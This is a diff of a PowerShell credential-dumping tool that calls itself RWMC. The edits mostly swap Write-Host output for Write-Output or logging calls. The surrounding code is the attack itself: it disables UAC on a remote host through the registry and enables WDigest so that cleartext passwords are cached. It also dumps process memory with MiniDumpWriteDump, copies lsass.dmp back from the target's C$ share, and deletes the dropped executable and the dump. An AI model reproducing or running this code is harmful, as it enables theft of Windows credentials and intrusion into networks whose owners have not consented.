@@ -42,13 +42,13 @@ function Disable-UAC($computername) {
     $test = $objRegkey.GetValue($nameRegistryKey)
     if($test -eq $null){    
         Set-RegistryKey $computername $parentKey $nameRegistryKey $valueRegistryKey     
-        Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
+        Write-Output "Registry key setted, you have to reboot the remote computer"
         Stop-Script
     }
     else {
         if($test -ne 1){
             Set-RegistryKey $computername $parentKey $nameRegistryKey $valueRegistryKey     
-            Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
+            Write-Output "Registry key setted, you have to reboot the remote computer"
             Stop-Script
         }
     }
@@ -87,14 +87,14 @@ function Write-Minidump ($process, $dumpFilePath) {
     try{
         $result = $miniDumpWriteDump.Invoke($null, @($processHandle,$processId,$fileStream.SafeFileHandle,$miniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))        
         if(!$result) {
-            Write-Host "Error : cannot dump the process" -ForegroundColor Red
+            Write-Output "Error : cannot dump the process"
             $fileStream.Close()
             Stop-Script
         }
     }
     catch{
         $_.Exception()       
-        Write-Host "Error : cannot dump the process" -ForegroundColor Red
+        Write-Output "Error : cannot dump the process"
         $fileStream.Close()
         Stop-Script 
     }
@@ -130,14 +130,14 @@ public static extern bool MiniDumpWriteDump(
     try{
         $result = $dbghelp::MiniDumpWriteDump($processHandle,$processId,$fileStream.SafeFileHandle.DangerousGetHandle(),$miniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero)
         if(!$result) {
-            Write-Host "Error : cannot dump the process" -ForegroundColor Red
+            Write-Output "Error : cannot dump the process"
             $fileStream.Close()
             Stop-Script
         }
     }
     catch{
         $_.Exception.Message
-        Write-Host "Error : cannot dump the process" -ForegroundColor Red
+        Write-Output "Error : cannot dump the process"
         $fileStream.Close()
         Stop-Script
     }
@@ -178,8 +178,7 @@ function Remote-Dumping($computername, $scriptPath, $logDirectoryPath) {
     Start-Sleep -Seconds 15
     Copy-Item -Path "\\$computername\\c$\windows\temp\lsass.dmp" -Destination "$logDirectoryPath"
     Remove-Item -Force "\\$computername\c$\windows\temp\msdsc.exe"
-    Remove-Item -Force "\\$computername\c$\windows\temp\lsass.dmp"        
-    Write-Progress -Activity "msdsc log created" -status "Running..." -id 1
+    Remove-Item -Force "\\$computername\c$\windows\temp\lsass.dmp"            
 }
 
 function Set-WdigestProvider {
@@ -188,14 +187,14 @@ function Set-WdigestProvider {
     $valueRegistryKey = "1"
     if(!(Get-ItemProperty -Path $parentKey -Name $nameRegistryKey -ErrorAction SilentlyContinue)){                  
         New-ItemProperty -Path $parentKey -Name $nameRegistryKey -Value $valueRegistryKey -PropertyType DWORD -Force | Out-Null            
-        Write-Host "Registry key setted, you have to reboot the local computer" -foregroundcolor "magenta"
+        Write-Output "Registry key setted, you have to reboot the local computer"
         Stop-Script
     }
     else {
         $valueSetted = (Get-ItemProperty -Path  $parentKey  -Name $nameRegistryKey).$nameRegistryKey
         if($valueSetted -ne 1) {
             New-ItemProperty -Path $parentKey -Name $nameRegistryKey -Value $valueRegistryKey -PropertyType DWORD -Force | Out-Null
-            Write-Host "Registry key setted, you have to reboot the local computer" -foregroundcolor "magenta"
+            Write-Output "Registry key setted, you have to reboot the local computer"
             Stop-Script
         }
     }
@@ -210,13 +209,13 @@ function Set-RemoteWdigestProvider ($server) {
     $test = $objRegkey.GetValue($nameRegistryKey)
     if($test -eq $null){    
         Set-RegistryKey $server $parentKey $nameRegistryKey $valueRegistryKey     
-        Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
+        Write-Output "Registry key setted, you have to reboot the remote computer"
         Stop-Script
     }
     else {
         if($test -ne 1){
             Set-RegistryKey $server $parentKey $nameRegistryKey $valueRegistryKey     
-            Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
+            Write-Output "Registry key setted, you have to reboot the remote computer"
             Stop-Script
         }
     }
@@ -267,9 +266,7 @@ function Stop-Script () {
     Begin{
         Write-Log -streamWriter $global:streamWriter -infoToLog "--- Script terminating ---"
     }
-    Process{        
-        "Script terminating..." 
-        Write-Output "================================================================================================"
+    Process{                        
         End-Log -streamWriter $global:streamWriter       
         Exit
     }
@@ -277,7 +274,7 @@ function Stop-Script () {
 
 function Test-InternetConnection {
     if(![Activator]::CreateInstance([Type]::GetTypeFromCLSID([Guid]'{DCB00C01-570F-4A9B-8D69-199FDBA5723B}')).IsConnectedToInternet){
-        Write-Output "The script need an Internet Connection to run"
+        Write-Log -streamWriter $global:streamWriter -infoToLog "The script need an Internet Connection to run"
         Stop-Script
     }
 }
@@ -306,7 +303,7 @@ function Test-LocalAdminRights {
         $adminMessage = " without administrator rights on "
     }
 
-    Write-Host "RWMC runs with user " -nonewline; Write-Host $myUser.Name -f Red -nonewline; Write-Host $adminMessage -nonewline; Write-Host $myComputer -f Red -nonewline; Write-Host " computer"
+    Write-Log -streamWriter $global:streamWriter -infoToLog "RWMC runs with user $($myUser.Name) $adminMessage $myComputer computer"
     return $adminFlag
 }
 
